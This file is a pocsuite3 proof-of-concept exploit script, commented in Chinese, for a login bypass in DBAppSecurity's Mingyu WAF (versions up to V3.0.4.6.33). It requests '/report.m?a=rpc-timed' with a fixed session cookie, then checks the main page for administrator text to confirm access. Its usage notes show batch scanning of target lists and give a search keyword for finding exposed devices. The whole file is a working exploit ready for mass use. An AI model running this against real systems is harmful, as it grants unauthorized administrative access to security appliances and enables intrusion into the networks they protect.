from collections import OrderedDict
import re,random,hashlib,base64
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str
from requests_toolbelt.multipart.encoder import MultipartEncoder



class DemoPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录ID，如果没有则为0
    version = '1'  # PoC 的版本，默认为1
    author = ''  # PoC 的作者
    vulDate = '2022-07-29'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2022-07-29'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2022-07-29'  # PoC 更新日期 (%Y-%m-%d)
    references = []  # 漏洞来源地址，0day 不用写
    name = '安恒信息-明御WAF登陆绕过'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'https://www.dbappsecurity.com.cn/'  # 漏洞厂商主页地址
    appName = '安恒信息-明御WAF'  # 漏洞应用名称
    appVersion = '<=V3.0.4.6.33'  # 漏洞影响版本
    vulType = 'Login Bypass	'  # 漏洞类型，参见漏洞类型规范表
    desc = '安恒信息-明御WAF存在登陆绕过漏洞。'  # 漏洞简要描述
    samples = ['http://192.168.3.8']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = '''
        安恒信息-明御WAF存在登陆绕过漏洞。
            # usage : 
                pocsuite -r pocs/mingyu_login_bypass.py -f urls.txt --verify
                pocsuite -r pocs/mingyu_login_bypass.py -f urls.txt --attack
                pocsuite -r pocs/mingyu_login_bypass.py -u http://192.168.3.8 --verify
                pocsuite -r pocs/mingyu_login_bypass.py -u http://192.168.3.8 --attack
            # keyword : 
                app="安恒信息-明御WAF"
    '''

    def _options(self):
        o = OrderedDict()
        return o

    def _verify(self):
        result = {}
        path = "/report.m?a=rpc-timed"
        headers={
            'Cookie': 'WAFFSSID=123456',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        }
        resp = requests.get(self.url + path, headers=headers,timeout=6)
        resq_result = requests.get(url=self.url,headers=headers,timeout=6)
        if resp.status_code == 200 and '系统管理员' in resq_result.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['POC'] = self.url+path
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()


register_poc(DemoPOC)